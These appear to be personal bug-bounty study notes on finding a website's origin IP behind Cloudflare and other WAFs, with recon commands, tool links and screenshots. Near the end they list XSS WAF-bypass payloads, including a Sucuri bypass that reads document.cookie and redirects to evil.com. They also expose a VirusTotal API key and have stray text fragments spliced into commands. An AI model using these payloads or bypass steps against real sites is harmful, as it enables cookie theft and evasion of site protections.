---
created: 2024-04-14T16:01
updated: 2025-03-12T15:44
---

resource: [Bypass Firewall by Finding Origin IP | by Ott3rly | May, 2024 | InfoSec Write-ups (infosecwriteups.com)](https://infosecwriteups.com/bypass-firewall-by-finding-origin-ip-41ba984e1342) & [Finding origin ip address. what is origin ip address | by loyalonlytoday | Aug, 2024 | System Weakness (medium.com)](https://medium.com/system-weakness/finding-origin-ip-address-672ca2e2967b)




Want to find the origin IP? 
1-Hunt for a subdomain with no WAF
2-extract the ASN
2-check it on **bgp.he.net**
3- grab the IP range, and verify a live IP. 




---

cheat sheet WAF bypass: https://github.com/waf-bypass-maker/waf-community-bypasses/blob/main/payloads.twitter.csv

# Firewall Basics

This is a basic diagram of how a firewall works:

![](https://miro.medium.com/v2/resize:fit:875/0*aBpUhgc2JCrcq_k2.png)

The regular user sends requests through the firewall, firewall <mark style="background: #FFB86CA6;">checks the request if it’s legit</mark>, and <mark style="background: #BBFABBA6;">passes that request to the server</mark>. Then the server processes that request, <mark style="background: #ADCCFFA6;">sends it back to the firewall and the firewall sends it to the client</mark>. It’s doing that <mark style="background: #FFB8EBA6;">because the origin server doesn’t want to disclose its own IP to the clients</mark>. On the other hand, a hacker (marked with a skull icon) doesn’t want to go through the middleman and wants to go to the server directly. If for example, you are sending SQL injection, XSS, or other payloads — those requests could be blocked by firewall rules. That’s why it’s a good idea to skip the struggle of bypassing WAF by knowing the location of the server — finding origin IP.

Sometimes there could be cases when the request <mark style="background: #CACFD9A6;">could be blocked by the server itself</mark>, or sometimes there could be rerouting if for example going directly, it <mark style="background: #FFF3A3A6;">could be rerouted</mark> to the firewall as well but those cases are exceptions. This time we will try to find a way just by accessing the origin IP here and trying to communicate directly.

# WAF Recon

The first thing that you should do always, is check if target truly has a web application firewall in place. There are a couple of easy ways to do that, so the first thing I like to do, is ping the target. In this example, I will ping my own website:

![](https://miro.medium.com/v2/resize:fit:875/0*b_lEMm_PqxyrXGev.png)

As you can see, it responds with IP. If it responds with that IP, <mark style="background: #D2B3FFA6;">it doesn’t mean that it will be like the origin IP of the server.</mark> It could be just a web application firewall IP address. If we try accessing it directly, it will show a regular Cloudflare error:

![](https://miro.medium.com/v2/resize:fit:875/0*msBUrlkwHao8yGG9.png)

Another thing that you can do, is also use the Wappalyzer plugin. If you try to inspect this website, it will show that I’m using Cloudflare:

  
![](https://miro.medium.com/v2/resize:fit:639/0*16U8qiZPGTr3IIfS.png)

Another thing is also going back to the terminal and using tools like [dnsrecon](https://github.com/darkoperator/dnsrecon):

> dnsrecon -d ott3rly.com

This command will access DNS records, which could also indicate what WAF the server could use:

![](https://miro.medium.com/v2/resize:fit:875/0*yrcnBbP1nUEEGYk7.png)

Sometimes you can leak the origin IP address if the server does not use any WAF but in this case, we can see a lot of Cloudflare name servers.

If you are not a big fan of CLI tools, alternatively you could also check [who.is](http://who.is/) website.

# Method #1 — Shodan

The next thing I recommend for finding origin IP is using Shodan. It’s also easy to check for a lot of leaked IPs by using a basic search. You can filter out those IPs to not include known WAF headers, responses, etc. I usually filter by 200 status code as well. I like to use SSL shodan dorks with those mentioned filters:

![](https://miro.medium.com/v2/resize:fit:788/0*dywB9SNArcSkQVsn.png)

# Method #2 — Censys

Another good tool for IP recon is using [censys](https://search.censys.io/). Just paste your target in the search bar and you will be awarded with pretty interesting results:

![](https://miro.medium.com/v2/resize:fit:875/0*Yh2dcuKxjThqmheW.png)
# Method #3 — Security Trails

Lastly, my favorite method is using [Security Trails](https://securitytrails.com/). I recommend creating a free account and you could use it freely. This tool is good for targeting just a single website to get to know its IP address. I will use my own website as an example and try to access historical data:

![](https://miro.medium.com/v2/resize:fit:875/0*VL8OeiLX3HRga7Ld.png)

When I write **ott3rly.com** in the search bar and try to access **Historial Data**, the A DNS records are really worth looking. As you can see, <mark style="background: #BBFABBA6;">before using Cloudflare, the website was not under WAF so its origin IP was leaked</mark>. In this case, it’s the hosting provider’s origin IP so it’s not a really big deal, but usually, in regular testing scenarios, <mark style="background: #FFB86CA6;">you could stumble across the VPS IP address.</mark> In that case, there is a possibility to access the page directly by its IP.

# Final Tips

If you try all of those methods on your target, you will have a chance to not be detected under WAF radar. It will make your life much easier when you need to do certain exploitation, like fuzzing XSS, SQL injections… <mark style="background: #ADCCFFA6;">So before even building a sophisticated payload, I highly encourage you to find the origin IP.</mark>


Bypassing WAFs to Exploit CSPT Using Encoding Levels
https://matanber.com/blog/cspt-levels

Response Filter Denial of Service (RFDoS): shut down a website by triggering WAF rule
https://blog.sicuranext.com/response-filter-denial-of-service-a-new-way-to-shutdown-a-website

---


#source: [How I Discovering the Origin IP In Bug Bounty — Bug Bounty Tuesday | by kerstan - Freedium](https://freedium.cfd/https://medium.com/@kerstan/hou-i-discovering-the-origin-ip-in-bug-bounty-bug-bounty-tuesday-47fa16c4ef34)


When you're hunting on a bug bounty target and WAF stands in your way, here's a powerful technique to uncover the Origin IP by scanning the target's IP range.

I'll be using a simple yet effective tool called **hakoriginfinder** by hakluke! Get it!!!

> [https://github.com/hakluke/hakoriginfinder](https://github.com/hakluke/hakoriginfinder)

![None](https://miro.medium.com/v2/resize:fit:700/1*e-D9Pf-3ZOu-qmOyzGQVNg.png)

					[https://github.com/hakluke/hakoriginfinder](https://github.com/hakluke/hakoriginfinder)




_what are ASN?_

An autonomous system (AS) is a network, or a collection of networks managed by a one entity, for example governmental organizations, [internet service providers](https://www.ipxo.com/blog/what-is-isp/) (ISP) or educational institutions.  

Every autonomous system is given a distinct identification number called an autonomous system number (ASN). The [Internet Assigned Numbers Authority](https://www.ipxo.com/blog/what-is-iana/) (IANA) is responsible for managing ASNs. Keep in mind that ASN is necessary for routing your IP address.


### 2. methodology

Here's my methodology to find the Origin IP using this tool and technique:

1. Discover your target's **ASN and check** : [https://bgp.he.net/AS33848#_prefixes](https://bgp.he.net/AS33848#_prefixes)

![[Pasted image 20240724232041.png]]

![[Pasted image 20240724232058.png]]


2. Make a note of the target's IP range.

Assuming you have a WAF-protected domain called example[.]com. Use this command with the IP range Identified in step 1 and pass your target host against the -h parameter: `prips 93.184.216.0/24 | hakoriginfinder -h example[.]com`

![None](https://miro.medium.com/v2/resize:fit:700/1*2lO14qQYTeI9V_MTYbQhbA.png)

						hakoriginfinder running

**If you receive a "MATCH" output,** there's a strong likelihood that you've successfully identified the Origin IP. Now, you can send requests with the same Host header to bypass WAF or for whatever your mission requires.

### 3. Sub

> Check ASN

> Note target IP range

> Use HakOriginFinder

---

## Find Origin IP

_impact of Origin IP:_

site exposed its Non-Cloudflare **IP** which could allow bypassing of anti-DDoS mechanisms. Your **origin** servers are not blocking access from non-Cloudflare servers.This way crawlers can find your **origin** servers' **IPs** by checking random **IPs** until they found your **origin** server (s).



#source: https://youtu.be/YbbWBtCrSlE

![[{6B212B97-02FF-48D5-8AE0-D105777B99BC}.png]]


You can use a Tool called wafw00f to see what type of WAF a target is behind at.
![[{0BC5DF8E-4109-4D9B-A8FB-EEE5C64AC56B}.png]]

![[{A02BD5ED-4943-4E35-BDE8-40C5D9BA182F}.png]]

you can test that with **whatweb** too:

![[{9CA3BF5D-CBB3-4BE7-BC50-575F280DE98F}.png]]

you can always find some info by searching for DNS Hostnames by doing nslookup or whois but in this case it won't work.

A script that searches for your IP/Domain in the two websites that will search for anything related to the original website:

![[{F11C0A48-B450-4F11-BF59-5E0E87229AA5}.png]]

run the script:

![[{A80A38D0-9E5A-444D-9FB7-E8FE665B9915}.png]]

![[{6A782705-5563-491B-8F46-3437FD371155}.png]]


![[{B8918F66-4D92-4B40-A61E-569FBD29A938}.png]]


And then see if you have found the real IP by browsing to the website or seeing if there's a WAF on it:


![[{CD5E8303-1B55-4807-87A2-C8EA3EEBFA0C}.png]]

You can also try to fetch some data by this website:

![[{2C43A7C6-BEB6-420C-B84C-3B8807DC8E5E}.png]]

![[{EB9D6D67-D54C-4059-95BA-D9C7F66A509E}.png]]

> dnsrecon -d domain.com

_we simply look at the DNS historical data recall_

![[{2CCBEACD-A48D-4D71-AA9C-6CB77D22130F}.png]]

[CF Bypass is a tool that allows you to bypass a website running Cloudflare by finding the Origin IP of the domain](https://www.bing.com/ck/a?!&&p=c87788e09e208970JmltdHM9MTcyODAwMDAwMCZpZ3VpZD0yNDIyZjYyMC01ZjI2LTZhNmYtMmQ0Ni1lMzI5NWVmYjZiNGImaW5zaWQ9NTYxOA&ptn=3&ver=2&hsh=3&fclid=2422f620-5f26-6a6f-2d46-e3295efb6b4b&psq=cf-bypass&u=a1aHR0cHM6Ly9naXRodWIuY29tL1JvbmktQ2FydGEvY2YtYnlwYXNz&ntb=1)[1](https://www.bing.com/ck/a?!&&p=2fab86d08d2bd495JmltdHM9MTcyODAwMDAwMCZpZ3VpZD0yNDIyZjYyMC01ZjI2LTZhNmYtMmQ0Ni1lMzI5NWVmYjZiNGImaW5zaWQ9NTYxOQ&ptn=3&ver=2&hsh=3&fclid=2422f620-5f26-6a6f-2d46-e3295efb6b4b&psq=cf-bypass&u=a1aHR0cHM6Ly9naXRodWIuY29tL1JvbmktQ2FydGEvY2YtYnlwYXNz&ntb=1). [Other methods to bypass Cloudflare include](https://www.bing.com/ck/a?!&&p=f519dd6c4de2502cJmltdHM9MTcyODAwMDAwMCZpZ3VpZD0yNDIyZjYyMC01ZjI2LTZhNmYtMmQ0Ni1lMzI5NWVmYjZiNGImaW5zaWQ9NTYyMA&ptn=3&ver=2&hsh=3&fclid=2422f620-5f26-6a6f-2d46-e3295efb6b4b&psq=cf-bypass&u=a1aHR0cHM6Ly93d3cuY3JlYXRlaXQuY29tL2Jsb2cvdGVzdGluZy1jbG91ZGZsYXJlLWJ5cGFzc2luZy1jYWNoZS8&ntb=1)[2](https://www.bing.com/ck/a?!&&p=93679fd3c58715c4JmltdHM9MTcyODAwMDAwMCZpZ3VpZD0yNDIyZjYyMC01ZjI2LTZhNmYtMmQ0Ni1lMzI5NWVmYjZiNGImaW5zaWQ9NTYyMQ&ptn=3&ver=2&hsh=3&fclid=2422f620-5f26-6a6f-2d46-e3295efb6b4b&psq=cf-bypass&u=a1aHR0cHM6Ly93d3cuY3JlYXRlaXQuY29tL2Jsb2cvdGVzdGluZy1jbG91ZGZsYXJlLWJ5cGFzc2luZy1jYWNoZS8&ntb=1)[3](https://www.bing.com/ck/a?!&&p=1279ff9ce3fb36aeJmltdHM9MTcyODAwMDAwMCZpZ3VpZD0yNDIyZjYyMC01ZjI2LTZhNmYtMmQ0Ni1lMzI5NWVmYjZiNGImaW5zaWQ9NTYyMg&ptn=3&ver=2&hsh=3&fclid=2422f620-5f26-6a6f-2d46-e3295efb6b4b&psq=cf-bypass&u=a1aHR0cHM6Ly93d3cuemVucm93cy5jb20vYmxvZy9ieXBhc3MtY2xvdWRmbGFyZQ&ntb=1):

cf-bypass: [GitHub - Roni-Carta/cf-bypass](https://github.com/Roni-Carta/cf-bypass)

- [Disabling cache in the developer tool (Developer console) in Chrome Browser](https://www.bing.com/ck/a?!&&p=880660fc3bb428e8JmltdHM9MTcyODAwMDAwMCZpZ3VpZD0yNDIyZjYyMC01ZjI2LTZhNmYtMmQ0Ni1lMzI5NWVmYjZiNGImaW5zaWQ9NTYyMw&ptn=3&ver=2&hsh=3&fclid=2422f620-5f26-6a6f-2d46-e3295efb6b4b&psq=cf-bypass&u=a1aHR0cHM6Ly93d3cuY3JlYXRlaXQuY29tL2Jsb2cvdGVzdGluZy1jbG91ZGZsYXJlLWJ5cGFzc2luZy1jYWNoZS8&ntb=1)[2](https://www.bing.com/ck/a?!&&p=8540e1094a271fe1JmltdHM9MTcyODAwMDAwMCZpZ3VpZD0yNDIyZjYyMC01ZjI2LTZhNmYtMmQ0Ni1lMzI5NWVmYjZiNGImaW5zaWQ9NTYyNA&ptn=3&ver=2&hsh=3&fclid=2422f620-5f26-6a6f-2d46-e3295efb6b4b&psq=cf-bypass&u=a1aHR0cHM6Ly93d3cuY3JlYXRlaXQuY29tL2Jsb2cvdGVzdGluZy1jbG91ZGZsYXJlLWJ5cGFzc2luZy1jYWNoZS8&ntb=1).
- [Bypassing the waiting room and reverse engineering the challenge](https://www.bing.com/ck/a?!&&p=290a138c5c68a7b9JmltdHM9MTcyODAwMDAwMCZpZ3VpZD0yNDIyZjYyMC01ZjI2LTZhNmYtMmQ0Ni1lMzI5NWVmYjZiNGImaW5zaWQ9NTYyNQ&ptn=3&ver=2&hsh=3&fclid=2422f620-5f26-6a6f-2d46-e3295efb6b4b&psq=cf-bypass&u=a1aHR0cHM6Ly93d3cuemVucm93cy5jb20vYmxvZy9ieXBhc3MtY2xvdWRmbGFyZQ&ntb=1)[3](https://www.bing.com/ck/a?!&&p=4ac99faf9b0ea0c5JmltdHM9MTcyODAwMDAwMCZpZ3VpZD0yNDIyZjYyMC01ZjI2LTZhNmYtMmQ0Ni1lMzI5NWVmYjZiNGImaW5zaWQ9NTYyNg&ptn=3&ver=2&hsh=3&fclid=2422f620-5f26-6a6f-2d46-e3295efb6b4b&psq=cf-bypass&u=a1aHR0cHM6Ly93d3cuemVucm93cy5jb20vYmxvZy9ieXBhc3MtY2xvdWRmbGFyZQ&ntb=1).
- [Using Cloudflare solvers](https://www.bing.com/ck/a?!&&p=e11bba8ce32de96bJmltdHM9MTcyODAwMDAwMCZpZ3VpZD0yNDIyZjYyMC01ZjI2LTZhNmYtMmQ0Ni1lMzI5NWVmYjZiNGImaW5zaWQ9NTYyNw&ptn=3&ver=2&hsh=3&fclid=2422f620-5f26-6a6f-2d46-e3295efb6b4b&psq=cf-bypass&u=a1aHR0cHM6Ly93d3cuemVucm93cy5jb20vYmxvZy9ieXBhc3MtY2xvdWRmbGFyZQ&ntb=1)[3](https://www.bing.com/ck/a?!&&p=d001269a4f1a91e9JmltdHM9MTcyODAwMDAwMCZpZ3VpZD0yNDIyZjYyMC01ZjI2LTZhNmYtMmQ0Ni1lMzI5NWVmYjZiNGImaW5zaWQ9NTYyOA&ptn=3&ver=2&hsh=3&fclid=2422f620-5f26-6a6f-2d46-e3295efb6b4b&psq=cf-bypass&u=a1aHR0cHM6Ly93d3cuemVucm93cy5jb20vYmxvZy9ieXBhc3MtY2xvdWRmbGFyZQ&ntb=1).
- [Using fortified headless browsers](https://www.bing.com/ck/a?!&&p=52cbb9277aa119f0JmltdHM9MTcyODAwMDAwMCZpZ3VpZD0yNDIyZjYyMC01ZjI2LTZhNmYtMmQ0Ni1lMzI5NWVmYjZiNGImaW5zaWQ9NTYyOQ&ptn=3&ver=2&hsh=3&fclid=2422f620-5f26-6a6f-2d46-e3295efb6b4b&psq=cf-bypass&u=a1aHR0cHM6Ly93d3cuemVucm93cy5jb20vYmxvZy9ieXBhc3MtY2xvdWRmbGFyZQ&ntb=1)[3](https://www.bing.com/ck/a?!&&p=c490a16321eadf7fJmltdHM9MTcyODAwMDAwMCZpZ3VpZD0yNDIyZjYyMC01ZjI2LTZhNmYtMmQ0Ni1lMzI5NWVmYjZiNGImaW5zaWQ9NTYzMA&ptn=3&ver=2&hsh=3&fclid=2422f620-5f26-6a6f-2d46-e3295efb6b4b&psq=cf-bypass&u=a1aHR0cHM6Ly93d3cuemVucm93cy5jb20vYmxvZy9ieXBhc3MtY2xvdWRmbGFyZQ&ntb=1).
- [Using smart proxy](https://www.bing.com/ck/a?!&&p=f087e02df96ae4ceJmltdHM9MTcyODAwMDAwMCZpZ3VpZD0yNDIyZjYyMC01ZjI2LTZhNmYtMmQ0Ni1lMzI5NWVmYjZiNGImaW5zaWQ9NTYzMQ&ptn=3&ver=2&hsh=3&fclid=2422f620-5f26-6a6f-2d46-e3295efb6b4b&psq=cf-bypass&u=a1aHR0cHM6Ly93d3cuemVucm93cy5jb20vYmxvZy9ieXBhc3MtY2xvdWRmbGFyZQ&ntb=1)[3](https://www.bing.com/ck/a?!&&p=9caa591faa4712f0JmltdHM9MTcyODAwMDAwMCZpZ3VpZD0yNDIyZjYyMC01ZjI2LTZhNmYtMmQ0Ni1lMzI5NWVmYjZiNGImaW5zaWQ9NTYzMg&ptn=3&ver=2&hsh=3&fclid=2422f620-5f26-6a6f-2d46-e3295efb6b4b&psq=cf-bypass&u=a1aHR0cHM6Ly93d3cuemVucm93cy5jb20vYmxvZy9ieXBhc3MtY2xvdWRmbGFyZQ&ntb=1).
- [Scraping Google Cache](https://www.bing.com/ck/a?!&&p=8eb011e9de5103a3JmltdHM9MTcyODAwMDAwMCZpZ3VpZD0yNDIyZjYyMC01ZjI2LTZhNmYtMmQ0Ni1lMzI5NWVmYjZiNGImaW5zaWQ9NTYzMw&ptn=3&ver=2&hsh=3&fclid=2422f620-5f26-6a6f-2d46-e3295efb6b4b&psq=cf-bypass&u=a1aHR0cHM6Ly93d3cuemVucm93cy5jb20vYmxvZy9ieXBhc3MtY2xvdWRmbGFyZQ&ntb=1)[3](https://www.bing.com/ck/a?!&&p=612cc8eeb9ae4e54JmltdHM9MTcyODAwMDAwMCZpZ3VpZD0yNDIyZjYyMC01ZjI2LTZhNmYtMmQ0Ni1lMzI5NWVmYjZiNGImaW5zaWQ9NTYzNA&ptn=3&ver=2&hsh=3&fclid=2422f620-5f26-6a6f-2d46-e3295efb6b4b&psq=cf-bypass&u=a1aHR0cHM6Ly93d3cuemVucm93cy5jb20vYmxvZy9ieXBhc3MtY2xvdWRmbGFyZQ&ntb=1).
- [Avoiding CAPTCHAs](https://www.bing.com/ck/a?!&&p=83d9ed0a00f73eb5JmltdHM9MTcyODAwMDAwMCZpZ3VpZD0yNDIyZjYyMC01ZjI2LTZhNmYtMmQ0Ni1lMzI5NWVmYjZiNGImaW5zaWQ9NTYzNQ&ptn=3&ver=2&hsh=3&fclid=2422f620-5f26-6a6f-2d46-e3295efb6b4b&psq=cf-bypass&u=a1aHR0cHM6Ly93d3cuemVucm93cy5jb20vYmxvZy9ieXBhc3MtY2xvdWRmbGFyZQ&ntb=1)[3](https://www.bing.com/ck/a?!&&p=3f82a9f08bdd079bJmltdHM9MTcyODAwMDAwMCZpZ3VpZD0yNDIyZjYyMC01ZjI2LTZhNmYtMmQ0Ni1lMzI5NWVmYjZiNGImaW5zaWQ9NTYzNg&ptn=3&ver=2&hsh=3&fclid=2422f620-5f26-6a6f-2d46-e3295efb6b4b&psq=cf-bypass&u=a1aHR0cHM6Ly93d3cuemVucm93cy5jb20vYmxvZy9ieXBhc3MtY2xvdWRmbGFyZQ&ntb=1).

other Tools: [cloudflare-bypass · GitHub Topics · GitHub](https://github.com/topics/cloudflare-bypass)


---


> https://github.com/musana/CF-Hero

_Comprehensive reconnaissance tool developed to discover the real IP addresses of web applications protected by Cloudflare. It performs multi-source intelligence gathering through various methods._

### Intelligence Sources

- ZoomEye search engine
- Censys search engine
- Shodan search engine
- SecurityTrails historical records

## Other wasy to find Origin IP:
# BY LOSTSEC

#origin_ip

┌───────────────────┐
│ Important Note!       │  **BEFORE GOING FORWARD! Here's a Automated Way to do it!**
└───────────────────┘

🚨 Origin Recon: The Ultimate ASN & Origin Detection Tool 🚨

🔥 Features-
**🚀 Subdomain extraction via Certificate Transparency (CRT.sh)**
**🚀 DNS resolution with SSRF protection**
**🚀 IP geolocation and ASN analysis**
**🚀 Common port scanning (80, 443, 22, etc.)**
**🚀 Critical origin IP detection (non-CDN)**

🔗 https://github.com/NazaninNazari/Origin_Recon

![[Pasted image 20250613202015.png]]

----

## Manual Approach

GET flavicon hashes: https://favicon-hash.kmsec.uk/  


**FIND FLAVICON HASHES:**



![[Pasted image 20241210155116.png]]


```shell
AlienVault.com  -- visit url:
https://otx.alienvault.com/api/v1/indicators/hostname/<DOMAIN>/url_list?limit=500&page=1

curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/dell.com/url_list?limit=500&page=1" | jq -r '.url_list[].result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'

--- ai può fare errori

```


```shell
URLScan.io
https://urlscan.io/api/v1/search/?q=domain:<DOMAIN>&size=10000

curl -s "https://urlscan.io/api/v1/search/?q=domain:dell.com&size=10000" | jq -r '.results[].page?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'

Webarchive
https://web.archive.org/cdx/search/cdx?url=<DOMAIN>&fl=original&collapse=urlkey

http.favicon.hash:1265477436

shodan search ssl.cert.subject.CN:"rapfame.app" 200 --fields ip_str | httpx-toolkit -sc -title -server -td

nmap --script ssl-cert -p 443 <IP Address>


--- ai può fare errori

```

-> use dnsrecon to discover the origin ip:

-> then test ips with wafw00f and if you suspect that, might be the true one, then, scan it with nmap:


![[Pasted image 20241210155216.png]]


as an output, nmap reflects  the DNS name of the real website, indicating that 

![[Pasted image 20241210155636.png]]

You can try using shodan too, then visit the ips, if not accessible then they aren't the **origin one:** ![[Pasted image 20241210155929.png]]

![[Pasted image 20241210155952.png]]

This command will only give you IP address result along with title and server info:

![[Pasted image 20241210160135.png]]


You can use this website to find the Origin IP too:

![[Pasted image 20241210160414.png]]

after searching for that and clicking on a IP, you can now generate an hash for the desired website, by copy and pasting the url:

![[Pasted image 20241210160717.png]]

![[Pasted image 20241210160606.png]]

And you may find something with the hash given:

![[Pasted image 20241210160944.png]]

or censys:

![[Pasted image 20241210161346.png]]


By clicking on each ip, check on wappalyzer, if there is a WAF, if not, then that should be the Origin one! You can verify that always **with nmap, by checking the certificate:**

![[Pasted image 20241210161213.png]]

You can check the Ip info of that website, just enter the domain and you can see a list of historycall ips:

![[Pasted image 20241210161304.png]]

You can check for DNS Records too:

> [MxAction Test - MxToolbox](https://mxtoolbox.com/Public/Content/Toolhandler.aspx?command=mx)

![[Pasted image 20241210161727.png]]

**Tip:** On Censys, you can also check the ip by the product version:

![[Pasted image 20241210162122.png]]


![[Pasted image 20241210162108.png]]

![[Pasted image 20241210162945.png]]

+ with flavicon hash:
![[Pasted image 20241210163032.png]]

![[Pasted image 20241210163046.png]]

### ZoomEye:

![[Pasted image 20241210163138.png]]

Or use virus total with this designed url:

![[Pasted image 20241210164337.png]]

```shell
VirusTotal.com
https://www.virustotal.com/vtapi/v2/domain/report?apikey=982680b1787fa59701919aa225150a25e00df1e3bb2bc4f186b8e919558d576c&domain=dell.com

curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=nasa.gov&apikey=982680b1787fa59701919aa225150a25e00df1e3bb2bc4f--- ai può fare errori186b8e919558d576c" | jq -r '. | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'

curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=982680b1787fa59701919aa225150a25e00df1e3bb2bc4f186b8e919558d576c&domain=www.nasa.gov" | jq -r '.domain_siblings[]'

--- ai può fare errori

```

![[Pasted image 20241210164100.png]]

						in the browser

![[Pasted image 20241210164518.png]]

						in the terminal

Add httpx to verify which **ip is valid and acceptable**: (might not find it, but you can with dnsrecon)

![[Pasted image 20241210164704.png]]

or:

![[Pasted image 20241210165458.png]]

## Bash Script to fetch unique IPs from VirusTotal an remove duplicates:

![[Pasted image 20241210170058.png]]
![[Pasted image 20241210170017.png]]

**Example output:**

![[Pasted image 20241210170425.png]]

![[Pasted image 20241210170907.png]]


-> nano /etc/hosts

![[Pasted image 20241210170940.png]]

and by visiting the website, by just the domain, we can open it without WAF:

since the ip belongs to that domain, if not, the page won't even load into the browser:

![[Pasted image 20241210171454.png]]

With burpsuite, simply change the hostname to the origin ip: (click on the pencil in the top right corner):

Put the origin ip by clicking on the pen:

![[Pasted image 20241210172222.png]]

And change the "Host" to the origin ip:


![[Pasted image 20241210172152.png]]

							(should give 200)

---

<iframe width="928" height="522" src="https://www.youtube.com/embed/2tF2LigSSP0" title="#2.7 Bypass Web Application Firewall (WAFs) using Tamper Script via SQLMap" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
![[{666339F9-7E77-43AE-B3A1-F072D7057967}.png]]


<iframe width="928" height="522" src="https://www.youtube.com/embed/joRKN9ZlfvI" title="Find the real IP of protected websites ( EASY METHODS )" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

---

## Finding Orgin IP of a website:


#source:   https://medium.com/@bobby.S/how-to-find-origin-ip-1f684f459942


#source: https://www.youtube.com/watch?v=V5XwYSChdvg


<iframe width="711" height="400" src="https://www.youtube.com/embed/V5XwYSChdvg" title="How to find Origin Ip of any website | Easy find Origin ips" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

GitHub Repo [https://github.com/christophetd/CloudFlair](https://www.youtube.com/redirect?event=comments&redir_token=QUFFLUhqbjVGUlpEOWFybHNpYzZjMDFKMWZlejVOTGdwQXxBQ3Jtc0tuci1YbmpIbUlScjJ2XzFMMEN2Tlo0bVAzR2s1cG1ZNlREYTZ6VUN0eHY5R09wR2RhbGhMb0Jlb19aa3lDNF9tYmFRT3RLaWF5R3NldzJkZFNBZ3E1amlDZThMY0I1R0RWWmh1LW1BUzZSb1Z4WkdQOA&q=https%3A%2F%2Fgithub.com%2Fchristophetd%2FCloudFlair)


---

<iframe width="928" height="522" src="https://www.youtube.com/embed/0OMmWtU2Y_g" title="#NahamCon2024: Modern WAF Bypass Techniques on Large Attack Surfaces" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<iframe width="928" height="522" src="https://www.youtube.com/embed/XIbB01f-ULQ" title="Bypassing Akamai WAF&#39;s XSS Protection: A Bug Bounty Hunter&#39;s Perspective" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

https://www.youtube.com/watch?v=VKnX1vj65Ro


XSS WAF Bypass: 

```
Imperva
<details/open/id="&quote;"ontoggle=[JS]>

Amazon
<details/open/id="&quote;"ontoggle=[JS]>

Akamai
<details open id="' &quote;'"ontoggle=[JS]>


```


https://youtu.be/d4KQqQz4LZI 

Sucuri WAF Bypass:

![[{DA108D8D-B271-4CF8-8150-0E6F4F25A5AE}.png]]

poc:
https://youtu.be/7BJl2MzFlnE?si=utsxlXeVjkppTR0S

payload:
```
<a aa aaa aaaa aaaaaa href=j&#97v&#97script&#x3A;&#97lert(document.cookie)>ClickMe

<a href="j&#97;vascript&#x3A;&#97;lert('Sucuri WAF Bypassed ! ' + document.domain + '\nCookie: ' + document.cookie); window&#46;location&#46;href='https://evil.com';">ClickMe</a>

```
----


## CSP Bypass:

![[{4DC257C2-093B-486A-825A-71FC55ECE36E}.png]]

this will help you to Bypass csp


http://cspbypass.com/

![[{4C00F9FD-A172-4CF4-AF4F-05EF2D84E5AA}.png]]

[SQLMap Tamper Scripts (aldern00b.com)](https://www.aldern00b.com/post/sqlmap-tamper-scripts)

---

you can try this cloudflare rocketloader nuclei template for SSRF and Finding Origin ip behind WAF helpful in WAF bypass:

https://github.com/coffinxp/nuclei-templates/blob/main/cloudflare-rocketloader-htmli.yaml - from lostsec